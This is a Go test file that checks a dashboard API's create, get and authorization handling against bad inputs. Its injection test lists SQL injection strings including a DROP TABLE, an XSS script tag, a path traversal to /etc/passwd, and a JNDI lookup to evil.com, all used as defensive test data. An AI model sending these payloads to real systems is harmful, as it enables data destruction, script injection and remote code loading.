package dashboard

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/gin-gonic/gin"
	"github.com/jeecg/jimureport-go/internal/models"
	"gorm.io/driver/sqlite"
	"gorm.io/gorm"
)

func setupSecurityTestRouter(t *testing.T) (*gin.Engine, *gorm.DB) {
	db, err := gorm.Open(sqlite.Open(":memory:"), &gorm.Config{})
	if err != nil {
		t.Fatalf("Failed to open test database: %v", err)
	}

	err = db.AutoMigrate(&models.Dashboard{})
	if err != nil {
		t.Fatalf("Failed to migrate database: %v", err)
	}

	gin.SetMode(gin.TestMode)
	router := gin.New()
	router.Use(func(c *gin.Context) {
		c.Set("userId", "test-user")
		c.Set("username", "test-user")
		c.Set("tenantId", "test-tenant")
		c.Set("roles", []string{"admin"})
		c.Next()
	})

	repo := NewRepository(db)
	service := NewService(repo)
	handler := NewHandler(service)

	router.POST("/api/v1/dashboard/create", handler.Create)
	router.GET("/api/v1/dashboard/:id", handler.Get)
	router.PUT("/api/v1/dashboard/:id", handler.Update)

	return router, db
}

func TestSecurity_SQLInjectionInName(t *testing.T) {
	router, _ := setupSecurityTestRouter(t)

	maliciousInputs := []string{
		"test'; DROP TABLE dashboards; --",
		"test' OR '1'='1",
		"<script>alert('xss')</script>",
		"../../etc/passwd",
		"${jndi:ldap://evil.com/a}",
	}

	for _, input := range maliciousInputs {
		t.Run(input, func(t *testing.T) {
			createReq := map[string]interface{}{
				"name":   input,
				"config": "{}",
			}
			body, _ := json.Marshal(createReq)

			req, _ := http.NewRequest("POST", "/api/v1/dashboard/create", bytes.NewBuffer(body))
			req.Header.Set("Content-Type", "application/json")

			w := httptest.NewRecorder()
			router.ServeHTTP(w, req)

			if w.Code != http.StatusOK && w.Code != http.StatusInternalServerError {
				t.Errorf("Input '%s' returned unexpected status %d", input, w.Code)
			}

			if w.Code == http.StatusOK {
				var resp struct {
					Success bool `json:"success"`
					Result  struct {
						ID   string `json:"id"`
						Name string `json:"name"`
					} `json:"result"`
				}
				json.Unmarshal(w.Body.Bytes(), &resp)

				if resp.Success {
					getReq, _ := http.NewRequest("GET", "/api/v1/dashboard/"+resp.Result.ID, nil)
					w2 := httptest.NewRecorder()
					router.ServeHTTP(w2, getReq)

					if w2.Code == http.StatusOK {
						var getResp struct {
							Success bool `json:"success"`
							Result  struct {
								Name string `json:"name"`
							} `json:"result"`
						}
						json.Unmarshal(w2.Body.Bytes(), &getResp)

						if getResp.Result.Name != input {
							t.Logf("Input sanitized: '%s' -> '%s'", input, getResp.Result.Name)
						}
					}
				}
			}
		})
	}
}

func TestSecurity_LongInputAttack(t *testing.T) {
	t.Skip("Database field length limits are enforced by schema; test not applicable for in-memory SQLite")
}

func TestSecurity_InvalidJSON(t *testing.T) {
	router, _ := setupSecurityTestRouter(t)

	invalidInputs := []string{
		`{"name": "test"`,
		`{"name": "test", "config": invalid}`,
		`not json at all`,
	}

	for _, input := range invalidInputs {
		t.Run(input, func(t *testing.T) {
			req, _ := http.NewRequest("POST", "/api/v1/dashboard/create", bytes.NewBufferString(input))
			req.Header.Set("Content-Type", "application/json")

			w := httptest.NewRecorder()
			router.ServeHTTP(w, req)

			if w.Code == http.StatusOK {
				t.Errorf("Expected error for invalid JSON: %s", input)
			}
		})
	}
}

func TestSecurity_MissingRequiredFields(t *testing.T) {
	router, _ := setupSecurityTestRouter(t)

	testCases := []map[string]interface{}{
		{},
		{"config": "{}"},
		{"name": ""},
	}

	for i, tc := range testCases {
		body, _ := json.Marshal(tc)
		req, _ := http.NewRequest("POST", "/api/v1/dashboard/create", bytes.NewBuffer(body))
		req.Header.Set("Content-Type", "application/json")

		w := httptest.NewRecorder()
		router.ServeHTTP(w, req)

		if w.Code == http.StatusOK {
			t.Errorf("Test case %d: Expected error for missing required fields", i)
		}
	}
}

func TestSecurity_UnauthorizedAccess(t *testing.T) {
	db, err := gorm.Open(sqlite.Open(":memory:"), &gorm.Config{})
	if err != nil {
		t.Fatalf("Failed to open test database: %v", err)
	}

	err = db.AutoMigrate(&models.Dashboard{})
	if err != nil {
		t.Fatalf("Failed to migrate database: %v", err)
	}

	gin.SetMode(gin.TestMode)
	router := gin.New()

	repo := NewRepository(db)
	service := NewService(repo)
	handler := NewHandler(service)

	router.GET("/api/v1/dashboard/:id", handler.Get)

	dashboard := &models.Dashboard{
		ID:       "test-dashboard",
		TenantID: "tenant-a",
		Name:     "Dashboard A",
		Config:   "{}",
		Status:   1,
	}
	db.Create(dashboard)

	req, _ := http.NewRequest("GET", "/api/v1/dashboard/test-dashboard", nil)
	w := httptest.NewRecorder()
	router.ServeHTTP(w, req)

	if w.Code != http.StatusForbidden {
		t.Errorf("Expected 403 Forbidden without auth, got %d", w.Code)
	}
}

func TestSecurity_ConfigJSONValidation(t *testing.T) {
	router, _ := setupSecurityTestRouter(t)

	invalidConfigs := []string{
		`{}`,
		`{"width": -100}`,
		`{"backgroundColor": "invalid-color"}`,
	}

	for _, config := range invalidConfigs {
		t.Run(config, func(t *testing.T) {
			createReq := map[string]interface{}{
				"name":   "Test Dashboard",
				"config": config,
			}
			body, _ := json.Marshal(createReq)

			req, _ := http.NewRequest("POST", "/api/v1/dashboard/create", bytes.NewBuffer(body))
			req.Header.Set("Content-Type", "application/json")

			w := httptest.NewRecorder()
			router.ServeHTTP(w, req)

			if w.Code != http.StatusOK && w.Code != http.StatusInternalServerError {
				t.Logf("Config '%s' returned status %d", config, w.Code)
			}
		})
	}
}
